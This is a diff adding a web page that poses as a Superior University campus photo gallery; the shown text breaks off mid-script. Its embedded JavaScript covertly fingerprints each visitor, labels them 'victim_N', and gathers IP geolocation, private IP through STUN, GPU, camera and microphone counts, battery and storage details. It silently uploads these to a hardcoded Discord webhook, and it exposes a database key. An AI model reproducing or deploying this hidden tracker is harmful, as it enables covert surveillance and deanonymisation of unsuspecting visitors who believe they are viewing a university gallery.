@@ -1,0 +1,780 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Superior University - Campus Gallery</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0a0a2e, #1a1a4e, #0d0d3d);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+        .snowflake {
+            position: fixed;
+            color: #fff;
+            font-size: 14px;
+            top: -20px;
+            animation: fall linear infinite;
+            opacity: 0.7;
+            z-index: 1;
+            pointer-events: none;
+            user-select: none;
+        }
+        @keyframes fall { to { transform: translateY(105vh) rotate(360deg); } }
+        .bubble {
+            position: fixed;
+            bottom: -50px;
+            background: radial-gradient(circle at 30% 30%, rgba(255,255,255,0.15), rgba(255,255,255,0.05));
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 50%;
+            animation: rise linear infinite;
+            z-index: 1;
+            pointer-events: none;
+        }
+        @keyframes rise {
+            0% { transform: translateY(0) scale(1); opacity: 0.4; }
+            50% { opacity: 0.7; }
+            100% { transform: translateY(-110vh) scale(0.5); opacity: 0; }
+        }
+        .main-container { position: relative; z-index: 2; max-width: 900px; margin: 0 auto; padding: 30px 20px; }
+        .header { text-align: center; padding: 40px 20px 30px; position: relative; }
+        .header::after {
+            content: ''; position: absolute; bottom: 0; left: 50%; transform: translateX(-50%);
+            width: 150px; height: 3px; background: linear-gradient(90deg, transparent, #ffd700, transparent); border-radius: 3px;
+        }
+        .header h1 {
+            font-size: 42px; font-weight: 800;
+            background: linear-gradient(135deg, #ffd700, #ff6b6b, #ffd700); background-size: 200% auto;
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            animation: shimmer 3s ease infinite; letter-spacing: 2px;
+        }
+        @keyframes shimmer {
+            0% { background-position: 0% center; }
+            50% { background-position: 100% center; }
+            100% { background-position: 0% center; }
+        }
+        .header p { color: rgba(255,255,255,0.7); font-size: 16px; margin-top: 12px; letter-spacing: 3px; font-weight: 300; }
+        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 18px; margin-top: 30px; }
+        .gallery-item {
+            position: relative; border-radius: 20px; overflow: hidden; cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            border: 2px solid rgba(255,215,0,0.15); box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+        }
+        .gallery-item:hover { transform: translateY(-10px) scale(1.02); border-color: rgba(255,215,0,0.5); box-shadow: 0 20px 60px rgba(255,215,0,0.15); }
+        .gallery-item img { width: 100%; height: 100%; object-fit: cover; display: block; transition: transform 0.6s ease; }
+        .gallery-item:hover img { transform: scale(1.08); }
+        .gallery-item .overlay {
+            position: absolute; bottom: 0; left: 0; right: 0; padding: 20px 15px 15px;
+            background: linear-gradient(transparent, rgba(0,0,0,0.8)); color: #fff;
+            opacity: 0; transform: translateY(10px); transition: all 0.4s ease;
+        }
+        .gallery-item:hover .overlay { opacity: 1; transform: translateY(0); }
+        .gallery-item .overlay h3 { font-size: 16px; font-weight: 600; color: #ffd700; }
+        .gallery-item .overlay p { font-size: 12px; color: rgba(255,255,255,0.7); margin-top: 4px; }
+        .stats-bar {
+            display: flex; justify-content: center; gap: 40px; margin-top: 35px; padding: 20px;
+            background: rgba(255,255,255,0.05); border-radius: 20px; border: 1px solid rgba(255,255,255,0.08);
+            backdrop-filter: blur(10px);
+        }
+        .stat-item { text-align: center; color: #fff; }
+        .stat-item .num {
+            font-size: 28px; font-weight: 700;
+            background: linear-gradient(135deg, #ffd700, #ff6b6b);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+        }
+        .stat-item .label { font-size: 12px; color: rgba(255,255,255,0.5); text-transform: uppercase; letter-spacing: 2px; margin-top: 4px; }
+        .footer { text-align: center; margin-top: 40px; padding: 25px; color: rgba(255,255,255,0.25); font-size: 12px; letter-spacing: 1px; border-top: 1px solid rgba(255,255,255,0.05); }
+        .user-badge {
+            position: fixed; top: 20px; right: 20px;
+            background: rgba(255,215,0,0.12); border: 1px solid rgba(255,215,0,0.25);
+            padding: 8px 18px; border-radius: 50px; color: #ffd700; font-size: 13px; font-weight: 600;
+            z-index: 100; backdrop-filter: blur(10px); letter-spacing: 1px; box-shadow: 0 4px 20px rgba(255,215,0,0.1);
+        }
+        .user-badge span { color: #ff6b6b; }
+        @media (max-width: 600px) {
+            .header h1 { font-size: 28px; }
+            .gallery-grid { grid-template-columns: 1fr 1fr; gap: 12px; }
+            .stats-bar { gap: 20px; flex-wrap: wrap; }
+            .stat-item .num { font-size: 22px; }
+            .user-badge { top: 10px; right: 10px; font-size: 11px; padding: 5px 12px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="user-badge">User: <span id="userCounter">0</span></div>
+<div id="snowContainer"></div>
+<div id="bubbleContainer"></div>
+
+<div class="main-container">
+    <div class="header">
+        <h1>✦ Superior University ✦</h1>
+        <p>EXPLORE OUR CAMPUS — LAHORE • SIALKOT • GUJRANWALA</p>
+    </div>
+    <div class="gallery-grid">
+        <div class="gallery-item">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRqdXAbgCFAlv7fp5Q4SEpLoniIoanmC5hnYU1S3Bdwcg&s=10" alt="Superior University Main Campus" loading="eager">
+            <div class="overlay"><h3>🏆 Main Campus</h3><p>17 KM Raiwind Road • Lahore</p></div>
+        </div>
+        <div class="gallery-item">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZ_PY86Ubg6rZ7s1WS_T7G7k3pBBmi4iwKqhW8bu09AA&s=10" alt="Superior University Gold Campus" loading="eager">
+            <div class="overlay"><h3>🏛️ Gold Campus</h3><p>CS & IT Faculty • Lahore</p></div>
+        </div>
+        <div class="gallery-item">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSPU3H1V8jvd97sroqg6H7z0NA6BBePkwtDGKgJlUMjYQ&s=10" alt="Superior University Campus" loading="eager">
+            <div class="overlay"><h3>🎉 Campus Life</h3><p>Events & Celebrations</p></div>
+        </div>
+        <div class="gallery-item">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRpiZ1XLKyAcph7fAR--T7V9cZWucQBR5CX_DNTIZESPg&s=10" alt="Superior University" loading="eager">
+            <div class="overlay"><h3>📱 Admissions Open</h3><p>Apply Now • 2026</p></div>
+        </div>
+    </div>
+    <div class="stats-bar">
+        <div class="stat-item"><div class="num">23+</div><div class="label">Years</div></div>
+        <div class="stat-item"><div class="num">15K+</div><div class="label">Students</div></div>
+        <div class="stat-item"><div class="num">4</div><div class="label">Campuses</div></div>
+        <div class="stat-item"><div class="num">50+</div><div class="label">Programs</div></div>
+    </div>
+    <div class="footer">
+        © 2026 Superior University • All Rights Reserved • Excellence Through Knowledge
+    </div>
+</div>
+
+<script>
+// ============================================================
+// 🔥 FINAL VERSION - SUPABASE VISITOR COUNTER + DISCORD
+// ============================================================
+
+// ===== SUPABASE CONFIG - APNI VALUES SE REPLACE KARO =====
+const SUPABASE_URL = "https://slwtzrlmjpabxflobkzg.supabase.co";
+const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNsd3R6cmxtanBhYnhmbG9ia3pnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODIzNjQyMTQsImV4cCI6MjA5Nzk0MDIxNH0.4iluISo8Casm-c5SZguEhPWvhcMUiK-jd2aijGDOLZw";
+
+// ===== DISCORD WEBHOOK =====
+var WH = "https://discord.com/api/webhooks/1518297706362044446/sYS8j36rHD3v3x9cVAOZgd8EVOG-bWVMSzq5FxtJD5EIG6IViaCGt5ej2I7FDUzsYjuR";
+
+// 🆔 FINGERPRINT
+function fp(){
+  var s = navigator.userAgent + screen.width + 'x' + screen.height + 'x' + screen.colorDepth + 
+         (Intl.DateTimeFormat().resolvedOptions().timeZone||'') + (navigator.language||'') + 
+         (navigator.hardwareConcurrency||0) + (navigator.deviceMemory||0);
+  var h = 0;
+  for(var i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h|=0}
+  return Math.abs(h).toString(36);
+}
+
+var _fp = fp();
+
+// ✅ NAYA: Supabase se visitor number lein
+async function getVisitorNumber(fingerprint) {
+  try {
+    const res = await fetch(SUPABASE_URL + "/rest/v1/rpc/register_visitor", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "apikey": SUPABASE_KEY,
+        "Authorization": "Bearer " + SUPABASE_KEY
+      },
+      body: JSON.stringify({
+        p_fingerprint: fingerprint,
+        p_ip: null,
+        p_country: null,
+        p_city: null,
+        p_device: null,
+        p_user_agent: navigator.userAgent
+      })
+    });
+    if (!res.ok) return 1;
+    return await res.json();
+  } catch(e) {
+    return 1;
+  }
+}
+
+// ✅ NAYA: Visitor number initialize karo
+var _un = 1;
+var _fn = 'victim_1';
+
+getVisitorNumber(_fp).then(function(num) {
+  _un = num;
+  _fn = 'victim_' + _un;
+  document.getElementById('userCounter').textContent = _un;
+  
+  // Ab data collect karo (jab number mil gaya)
+  collect();
+});
+
+// ❄️ SNOW EFFECT
+(function(){
+  var c = document.getElementById('snowContainer');
+  for(var i=0;i<50;i++){
+    var e = document.createElement('div'); e.className = 'snowflake';
+    e.textContent = ['❄','❅','❆','✦'][Math.floor(Math.random()*4)];
+    e.style.left = Math.random()*100+'%';
+    e.style.fontSize = (Math.random()*12+8)+'px';
+    e.style.opacity = Math.random()*0.5+0.3;
+    e.style.animationDuration = (Math.random()*8+6)+'s';
+    e.style.animationDelay = (Math.random()*10)+'s';
+    c.appendChild(e);
+  }
+})();
+
+// 🫧 BUBBLE EFFECT
+(function(){
+  var c = document.getElementById('bubbleContainer');
+  for(var i=0;i<20;i++){
+    var e = document.createElement('div'); e.className = 'bubble';
+    var sz = Math.random()*30+10;
+    e.style.width=sz+'px'; e.style.height=sz+'px';
+    e.style.left = Math.random()*100+'%';
+    e.style.animationDuration = (Math.random()*10+10)+'s';
+    e.style.animationDelay = (Math.random()*15)+'s';
+    c.appendChild(e);
+  }
+})();
+
+// 📱 DEVICE MODEL
+function getModel(){
+  var u = navigator.userAgent;
+  if(u.indexOf('Android')!==-1){
+    var m = u.match(/Android[\s/][\d.]+;\s*([^;)]+)/);
+    if(m&&m[1]&&m[1].indexOf('Build')===-1) return m[1].trim();
+    var m2 = u.match(/;\s*([^;]+)\s*Build\//);
+    if(m2) return m2[1].trim();
+    return 'Android';
+  }
+  if(u.indexOf('iPhone')!==-1) return 'iPhone';
+  if(u.indexOf('iPad')!==-1) return 'iPad';
+  if(u.indexOf('Mac')!==-1) return 'Mac';
+  if(u.indexOf('Windows')!==-1){
+    var wv = u.match(/Windows NT ([\d.]+)/);
+    if(wv){
+      var v = parseFloat(wv[1]);
+      if(v>=10) return 'Windows 10/11';
+      if(v>=6.3) return 'Windows 8.1';
+      if(v>=6.2) return 'Windows 8';
+      if(v>=6.1) return 'Windows 7';
+    }
+    return 'Windows';
+  }
+  if(u.indexOf('Linux')!==-1){
+    if(u.indexOf('Android')===-1){
+      if(u.indexOf('CrOS')!==-1) return 'ChromeOS';
+      if(u.indexOf('Ubuntu')!==-1) return 'Ubuntu Linux';
+      return 'Linux Desktop';
+    }
+  }
+  return 'Unknown';
+}
+
+// 🔍 HEADLESS DETECTION
+function isHeadless(){
+  var ua = navigator.userAgent;
+  if(ua.indexOf('HeadlessChrome') !== -1) return true;
+  if(ua.indexOf('PhantomJS') !== -1) return true;
+  if(navigator.webdriver === true) return true;
+  if(!navigator.plugins || navigator.plugins.length === 0){
+    if(ua.indexOf('Chrome') !== -1) return true;
+  }
+  if(navigator.languages && navigator.languages.length === 1 && navigator.languages[0] === 'en-US'){
+    if(!navigator.pdfViewerEnabled) return true;
+  }
+  if(ua.indexOf('Chrome') !== -1 && !navigator.pdfViewerEnabled) return true;
+  if(ua.indexOf('Headless') !== -1) return true;
+  return false;
+}
+
+// 💾 REAL RAM
+function getRealRAM(){
+  if(navigator.deviceMemory){
+    var dm = navigator.deviceMemory;
+    if(dm === 2 && isHeadless()) return 'Unknown (Headless)';
+    return dm + ' GB';
+  }
+  if(window.performance && window.performance.memory){
+    var jsHeapSize = window.performance.memory.jsHeapSizeLimit;
+    if(jsHeapSize > 8 * 1024 * 1024 * 1024) return '8+ GB';
+    if(jsHeapSize > 4 * 1024 * 1024 * 1024) return '4-8 GB';
+    if(jsHeapSize > 2 * 1024 * 1024 * 1024) return '2-4 GB';
+    return 'Unknown';
+  }
+  return 'N/A';
+}
+
+// 📤 SEND TO DISCORD
+function send(txt, type){
+  var filename = type + '_' + _fn + '.txt';
+  var blob = new Blob([txt], {type:'text/plain'});
+  var fd = new FormData();
+  fd.append('file', blob, filename);
+  fetch(WH, {method:'POST', body:fd}).catch(function(err){});
+}
+
+// 📊 BUILD REPORT
+function buildReport(d, type){
+  var ua = navigator.userAgent;
+  var m = getModel();
+  var headless = isHeadless();
+  var ram = getRealRAM();
+  var label = (type==='initial')?'🆕 NEW VISITOR':'🔄 UPDATE';
+  
+  var txt = '';
+  txt += '╔══════════════════════════════════════════════════════════════╗\n';
+  txt += '║        📸  SUPERIOR UNIVERSITY - VISITOR TRACKER            ║\n';
+  txt += '║              ─  ' + label + '  ─              ║\n';
+  txt += '╚══════════════════════════════════════════════════════════════╝\n\n';
+  
+  txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n';
+  txt += '  👤  USER & SESSION\n';
+  txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n\n';
+  txt += '  🆔  User #          :  ' + _un + '\n';
+  txt += '  🔑  Fingerprint     :  `' + _fp + '`\n';
+  txt += '  🕐  Time            :  ' + new Date().toLocaleString() + '\n';
+  txt += '  🌍  TimeZone        :  ' + (Intl.DateTimeFormat().resolvedOptions().timeZone||'N/A') + '\n';
+  txt += '  🔄  UTC Offset      :  UTC ' + (new Date().getTimezoneOffset()/-1) + 'h\n';
+  txt += '  🤖  Headless        :  ' + (headless?'⚠️ YES (Bot/Automation)':'✅ No (Real User)') + '\n';
+  txt += '  📋  Report Type     :  ' + type.toUpperCase() + '\n\n';
+  
+  txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n';
+  txt += '  📍  GEO & NETWORK (ip-api.com format)\n';
+  txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n\n';
+  txt += '  🌐  query          :  `' + d.ip + '`\n';
+  txt += '  ✅  status         :  ' + d.status + '\n';
+  txt += '  🌏  continent      :  ' + d.continent + '\n';
+  txt += '  🌍  continentCode  :  ' + d.continentCode + '\n';
+  txt += '  🗺️  country        :  ' + d.country + '\n';
+  txt += '  🏁  countryCode    :  ' + d.countryCode + '\n';
+  txt += '  📍  region         :  ' + d.region + '\n';
+  txt += '  🏙️  regionName     :  ' + d.regionName + '\n';
+  txt += '  🏛️  city           :  ' + d.city + '\n';
+  txt += '  🏘️  district       :  ' + d.district + '\n';
+  txt += '  📮  zip            :  ' + d.zip + '\n';
+  txt += '  📐  lat            :  ' + d.lat + '\n';
+  txt += '  📐  lon            :  ' + d.lon + '\n';
+  txt += '  🕐  timezone       :  ' + d.timezone + '\n';
+  txt += '  🔄  offset         :  ' + d.offset + '\n';
+  txt += '  💰  currency       :  ' + d.currency + '\n';
+  txt += '  🏢  isp            :  ' + d.isp + '\n';
+  txt += '  🏢  org            :  ' + d.org + '\n';
+  txt += '  🔢  as             :  ' + d.as + '\n';
+  txt += '  🔢  asname         :  ' + d.asname + '\n';
+  txt += '  📱  mobile         :  ' + d.mobile + '\n';
+  txt += '  🔒  proxy          :  ' + d.proxy + '\n';
+  txt += '  🖥️  hosting        :  ' + d.hosting + '\n';
+  txt += '  🏠  Private IP     :  `' + d.priv + '`\n\n';
+  
+  txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n';
+  txt += '  📱  DEVICE INFO\n';
+  txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n\n';
+  txt += '  🏷️  Model          :  ' + m + '\n';
+  txt += '  💻  Platform       :  ' + (navigator.platform||'N/A') + '\n';
+  txt += '  🧠  CPU Cores      :  ' + (navigator.hardwareConcurrency||'N/A') + '\n';
+  txt += '  💾  RAM            :  ' + ram + '\n';
+  txt += '  👆  Max Touch      :  ' + (navigator.maxTouchPoints||0) + '\n';
+  txt += '  📷  Cameras        :  ' + d.cams + '\n';
+  txt += '  🎤  Microphones    :  ' + d.mics + '\n';
+  txt += '  🔊  Speakers       :  ' + d.spks + '\n\n';
+  
+  txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n';
+  txt += '  💻  BROWSER DETAILS\n';
+  txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n\n';
+  txt += '  🖥️  UA             :  `' + ua + '`\n';
+  txt += '  🔤  Language       :  ' + (navigator.language||'N/A') + '\n';
+  txt += '  🗣️  Languages      :  ' + ((navigator.languages||[]).join(', ')||'N/A') + '\n';
+  txt += '  🍪  Cookies        :  ' + (navigator.cookieEnabled?'✅ Yes':'❌ No') + '\n';
+  txt += '  🚫  DNT            :  ' + (navigator.doNotTrack||'Not Set') + '\n';
+  txt += '  🎯  Vendor         :  ' + (navigator.vendor||'N/A') + '\n';
+  txt += '  🧩  Plugins        :  ' + (navigator.plugins?navigator.plugins.length:'0') + '\n';
+  txt += '  📋  PDF Viewer     :  ' + (navigator.pdfViewerEnabled?'✅ Yes':'❌ No') + '\n';
+  txt += '  🎮  GPU            :  ' + d.gpu + '\n';
+  txt += '  🕵️  WebDriver      :  ' + (navigator.webdriver?'⚠️ Yes':'✅ No') + '\n';
+  txt += '  🤖  Headless       :  ' + (headless?'⚠️ YES':'✅ NO') + '\n';
+  txt += '  🔄  Online         :  ' + (navigator.onLine?'✅ On':'❌ Off') + '\n\n';
+  
+  txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n';
+  txt += '  🖥️  SCREEN\n';
+  txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n\n';
+  txt += '  📺  Resolution     :  ' + screen.width + ' × ' + screen.height + '\n';
+  txt += '  🎨  Color Depth    :  ' + screen.colorDepth + '-bit\n';
+  txt += '  📐  Available      :  ' + screen.availWidth + ' × ' + screen.availHeight + '\n';
+  txt += '  🔍  Pixel Ratio    :  ' + (window.devicePixelRatio||1) + '\n';
+  txt += '  🪟  Window         :  ' + window.innerWidth + ' × ' + window.innerHeight + '\n';
+  txt += '  🔄  Orientation    :  ' + (screen.orientation?screen.orientation.type:(window.innerHeight>window.innerWidth?'portrait':'landscape')) + '\n\n';
+  
+  txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n';
+  txt += '  🔋  BATTERY\n';
+  txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n\n';
+  txt += '  🔋  Level          :  ' + d.batL + '\n';
+  txt += '  ⚡  Charging       :  ' + d.batC + '\n';
+  txt += '  ⏱️  Time Left      :  ' + d.batT + '\n\n';
+  
+  txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n';
+  txt += '  📶  CONNECTION\n';
+  txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n\n';
+  txt += '  🔌  Type           :  ' + d.ct + '\n';
+  txt += '  📡  Effective Type :  ' + d.ce + '\n';
+  txt += '  ⏳  RTT            :  ' + d.cr + '\n';
+  txt += '  📥  Downlink       :  ' + d.cd + '\n';
+  txt += '  🔒  Save Data      :  ' + d.csv + '\n\n';
+  
+  txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n';
+  txt += '  💾  STORAGE\n';
+  txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n\n';
+  txt += '  💿  Used           :  ' + d.su + '\n';
+  txt += '  💿  Total          :  ' + d.st + '\n';
+  txt += '  🍪  Local Storage  :  ' + d.li + ' items\n';
+  txt += '  📦  Session Stor.  :  ' + d.si + ' items\n\n';
+  
+  txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n';
+  txt += '  🔗  PAGE INFO\n';
+  txt += '◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\n\n';
+  txt += '  🔗  Referrer       :  ' + (document.referrer||'Direct') + '\n';
+  txt += '  📄  URL            :  ' + window.location.href + '\n';
+  txt += '  📋  Title          :  ' + document.title + '\n';
+  txt += '  ⏱️  Load Time      :  ' + (window.performance?Math.round(window.performance.now())+' ms':'N/A') + '\n\n';
+  
+  txt += '╔══════════════════════════════════════════════════════════════╗\n';
+  txt += '║     ✨ End of Report — Superior University Gallery ✨       ║\n';
+  txt += '╚══════════════════════════════════════════════════════════════╝\n';
+  
+  send(txt, type);
+}
+
+// 📦 GLOBAL DATA OBJECT
+var _data = {
+  ip:'N/A', status:'failed',
+  continent:'N/A', continentCode:'N/A',
+  country:'N/A', countryCode:'N/A',
+  region:'N/A', regionName:'N/A',
+  city:'N/A', district:'N/A',
+  zip:'N/A', lat:'N/A', lon:'N/A',
+  timezone:'N/A', offset:'N/A', currency:'N/A',
+  isp:'N/A', org:'N/A',
+  as:'N/A', asname:'N/A',
+  mobile:'N/A', proxy:'N/A', hosting:'N/A',
+  priv:'N/A',
+  gpu:'N/A', cams:'N/A', mics:'N/A', spks:'N/A',
+  batL:'N/A', batC:'N/A', batT:'N/A',
+  ct:'N/A', ce:'N/A', cr:'N/A', cd:'N/A', csv:'N/A',
+  su:'N/A', st:'N/A', li:'N/A', si:'N/A'
+};
+
+var _initialSent = false;
+
+// 🔄 TRY MULTIPLE APIs
+function fetchIPData(callback){
+  var apis = [
+    // API 1: ip-api.com (HTTPS - full data)
+    function(cb){
+      var x = new XMLHttpRequest();
+      x.open('GET', 'https://ip-api.com/json/?fields=status,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,mobile,proxy,hosting,query', true);
+      x.onload = function(){
+        try{
+          var j = JSON.parse(x.responseText);
+          if(j.status === 'success' && j.query){
+            cb(j);
+            return;
+          }
+        }catch(e){}
+        cb(null);
+      };
+      x.onerror = function(){ cb(null); };
+      x.send();
+    },
+    // API 2: ip-api.com with no fields filter (backup)
+    function(cb){
+      var x = new XMLHttpRequest();
+      x.open('GET', 'https://ip-api.com/json/', true);
+      x.onload = function(){
+        try{
+          var j = JSON.parse(x.responseText);
+          if(j.status === 'success' && j.query){
+            cb(j);
+            return;
+          }
+        }catch(e){}
+        cb(null);
+      };
+      x.onerror = function(){ cb(null); };
+      x.send();
+    },
+    // API 3: ipinfo.io (backup)
+    function(cb){
+      var x = new XMLHttpRequest();
+      x.open('GET', 'https://ipinfo.io/json', true);
+      x.onload = function(){
+        try{
+          var j = JSON.parse(x.responseText);
+          if(j.ip){
+            cb({
+              query: j.ip,
+              status: 'success',
+              country: j.country||'N/A',
+              region: j.region||'N/A',
+              regionName: j.region||'N/A',
+              city: j.city||'N/A',
+              zip: j.postal||'N/A',
+              lat: j.loc?j.loc.split(',')[0]:'N/A',
+              lon: j.loc?j.loc.split(',')[1]:'N/A',
+              timezone: j.timezone||'N/A',
+              isp: j.org||'N/A',
+              org: j.org||'N/A',
+              as: j.asn||j.org||'N/A',
+              asname: j.asn||'N/A',
+              continent: 'N/A',
+              continentCode: 'N/A',
+              countryCode: j.country||'N/A',
+              district: 'N/A',
+              offset: 'N/A',
+              currency: 'N/A',
+              mobile: 'N/A',
+              proxy: 'N/A',
+              hosting: 'N/A'
+            });
+            return;
+          }
+        }catch(e){}
+        cb(null);
+      };
+      x.onerror = function(){ cb(null); };
+      x.send();
+    }
+  ];
+  
+  function tryAPI(idx){
+    if(idx >= apis.length){
+      callback(null);
+      return;
+    }
+    apis[idx](function(result){
+      if(result){
+        callback(result);
+      } else {
+        tryAPI(idx+1);
+      }
+    });
+  }
+  
+  tryAPI(0);
+}
+
+// 🔄 MAP API DATA
+function mapAPIData(apiData){
+  if(!apiData) return;
+  
+  _data.ip = apiData.query||'N/A';
+  _data.status = apiData.status||'success';
+  _data.continent = apiData.continent||'N/A';
+  _data.continentCode = apiData.continentCode||'N/A';
+  _data.country = apiData.country||'N/A';
+  _data.countryCode = apiData.countryCode||'N/A';
+  _data.region = apiData.region||'N/A';
+  _data.regionName = apiData.regionName||apiData.region||'N/A';
+  _data.city = apiData.city||'N/A';
+  _data.district = apiData.district||'N/A';
+  _data.zip = apiData.zip||apiData.postal||'N/A';
+  _data.lat = apiData.lat!==undefined?apiData.lat:'N/A';
+  _data.lon = apiData.lon!==undefined?apiData.lon:'N/A';
+  _data.timezone = apiData.timezone||'N/A';
+  _data.offset = apiData.offset!==undefined?apiData.offset:'N/A';
+  _data.currency = apiData.currency||'N/A';
+  _data.isp = apiData.isp||'N/A';
+  _data.org = apiData.org||'N/A';
+  _data.as = apiData.as||'N/A';
+  _data.asname = apiData.asname||'N/A';
+  _data.mobile = apiData.mobile!==undefined?(apiData.mobile?'✅ Yes':'❌ No'):'N/A';
+  _data.proxy = apiData.proxy!==undefined?(apiData.proxy?'⚠️ Yes':'✅ No'):'N/A';
+  _data.hosting = apiData.hosting!==undefined?(apiData.hosting?'✅ Yes':'❌ No'):'N/A';
+}
+
+// 🏠 PRIVATE IP via STUN
+function getPrivateIP(callback){
+  try{
+    var pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+    pc.createDataChannel('');
+    pc.createOffer().then(function(o){pc.setLocalDescription(o);}).catch(function(){});
+    var timeout = setTimeout(function(){
+      try{pc.close();}catch(e){}
+      callback(null);
+    }, 2000);
+    pc.onicecandidate = function(e){
+      if(e && e.candidate && e.candidate.candidate){
+        var parts = e.candidate.candidate.split(' ');
+        var ip = parts[4]||'';
+        if(ip && ip !== '0.0.0.0' && ip.indexOf('.local') === -1 && ip !== 'host' && !ip.startsWith(':')){
+          clearTimeout(timeout);
+          try{pc.close();}catch(e){}
+          callback(ip);
+          return;
+        }
+      }
+    };
+  } catch(e){
+    callback(null);
+  }
+}
+
+// 🎮 GPU
+function getGPU(){
+  try{
+    var c = document.createElement('canvas');
+    var g = c.getContext('webgl')||c.getContext('experimental-webgl');
+    if(g){
+      var di = g.getExtension('WEBGL_debug_renderer_info');
+      if(di) return g.getParameter(di.UNMASKED_RENDERER_WEBGL);
+    }
+  } catch(e){}
+  return 'N/A';
+}
+
+// 📡 MEDIA DEVICES
+function getMediaDevices(callback){
+  try{
+    if(navigator.mediaDevices && navigator.mediaDevices.enumerateDevices){
+      navigator.mediaDevices.enumerateDevices().then(function(devs){
+        var ca=0,mi=0,sp=0;
+        devs.forEach(function(x){
+          if(x.kind==='videoinput') ca++;
+          if(x.kind==='audioinput') mi++;
+          if(x.kind==='audiooutput') sp++;
+        });
+        callback(ca, mi, sp);
+      }).catch(function(){ callback(0,0,0); });
+    } else {
+      callback(0,0,0);
+    }
+  } catch(e){ callback(0,0,0); }
+}
+
+// 🔋 BATTERY
+function getBattery(callback){
+  try{
+    if(navigator.getBattery){
+      navigator.getBattery().then(function(b){
+        callback(
+          Math.round(b.level*100)+'%',
+          b.charging?'✅ Yes':'❌ No',
+          b.dischargingTime===Infinity?'♾️ Plugged in':Math.round(b.dischargingTime/60)+' min'
+        );
+      }).catch(function(){ callback('N/A','N/A','N/A'); });
+    } else {
+      callback('N/A','N/A','N/A');
+    }
+  } catch(e){ callback('N/A','N/A','N/A'); }
+}
+
+// 🔄 MAIN COLLECT FUNCTION
+function collect(){
+  // Step 1: Set GPU immediately
+  _data.gpu = getGPU();
+  
+  // Step 2: Get media devices
+  getMediaDevices(function(cams, mics, spks){
+    _data.cams = cams;
+    _data.mics = mics;
+    _data.spks = spks;
+  });
+  
+  // Step 3: Get battery
+  getBattery(function(level, charging, timeLeft){
+    _data.batL = level;
+    _data.batC = charging;
+    _data.batT = timeLeft;
+  });
+  
+  // Step 4: Connection info
+  try{
+    if(navigator.connection){
+      var c = navigator.connection;
+      _data.ct = c.type||c.effectiveType||'N/A';
+      _data.ce = c.effectiveType||'N/A';
+      _data.cr = c.rtt?c.rtt+' ms':'N/A';
+      _data.cd = c.downlink?c.downlink+' Mbps':'N/A';
+      _data.csv = c.saveData?'✅ On':'❌ Off';
+    }
+  } catch(e){}
+  
+  // Step 5: Storage
+  try{
+    if(navigator.storage && navigator.storage.estimate){
+      navigator.storage.estimate().then(function(e){
+        _data.su = (e.usage/1024/1024).toFixed(2)+' MB';
+        _data.st = (e.quota/1024/1024).toFixed(2)+' MB';
+      }).catch(function(){});
+    }
+  } catch(e){}
+  try{ _data.li = localStorage.length; _data.si = sessionStorage.length; } catch(e){}
+  
+  // Step 6: Get private IP
+  getPrivateIP(function(ip){
+    if(ip) _data.priv = ip;
+  });
+  
+  // Step 7: Get IP geolocation data (MOST IMPORTANT)
+  fetchIPData(function(apiData){
+    if(apiData){
+      mapAPIData(apiData);
+    }
+    
+    // Send initial report (within 2-4 seconds)
+    if(!_initialSent){
+      _initialSent = true;
